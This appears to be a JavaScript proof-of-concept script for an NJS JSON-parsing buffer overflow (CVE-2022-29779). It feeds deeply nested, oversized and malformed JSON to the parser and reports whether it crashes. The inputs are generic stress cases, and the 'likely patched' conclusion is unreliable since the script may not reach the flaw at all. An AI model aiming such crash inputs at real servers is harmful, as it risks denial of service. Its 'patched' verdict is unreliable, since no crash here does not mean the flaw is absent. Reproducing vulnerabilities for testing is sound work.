// CVE-2022-29779 Proof of Concept
// Target: NJS versions with JSON parsing vulnerabilities
// Type: JSON parsing buffer overflow

function main() {
    console.log("Starting CVE-2022-29779 reproduction...");
    
    try {
        // Create deeply nested JSON structure
        let nestedJson = "{}";
        
        // Build deeply nested object
        for (let i = 0; i < 1000; i++) {
            nestedJson = `{"level_${i}": ${nestedJson}}`;
        }
        
        console.log("Testing deeply nested JSON parsing...");
        const parsedNested = JSON.parse(nestedJson);
        
        // Create JSON with large strings
        const largeStringJson = JSON.stringify({
            largeField: "x".repeat(100000),
            anotherField: "y".repeat(50000)
        });
        
        console.log("Testing large string JSON parsing...");
        const parsedLarge = JSON.parse(largeStringJson);
        
        // Create JSON with many properties
        const manyPropsObj = {};
        for (let i = 0; i < 5000; i++) {
            manyPropsObj[`property_${i}`] = `value_${i}`;
        }
        const manyPropsJson = JSON.stringify(manyPropsObj);
        
        console.log("Testing JSON with many properties...");
        const parsedManyProps = JSON.parse(manyPropsJson);
        
        // Create malformed JSON that might trigger vulnerability
        const malformedCases = [
            '{"a":' + '"x"'.repeat(1000) + '}',
            '[' + '1,'.repeat(10000) + '1]',
            '{"' + 'a'.repeat(1000) + '":"value"}'
        ];
        
        for (let i = 0; i < malformedCases.length; i++) {
            try {
                console.log(`Testing malformed JSON case ${i + 1}...`);
                const result = JSON.parse(malformedCases[i]);
                console.log(`Case ${i + 1} parsed successfully`);
            } catch (parseError) {
                console.log(`Case ${i + 1} failed as expected:`, parseError.message);
            }
        }
        
        console.log("CVE-2022-29779: JSON parsing operations completed");
        console.log("No crash detected - likely patched");
        
    } catch (error) {
        console.log("Error:", error.message);
    }
}

main();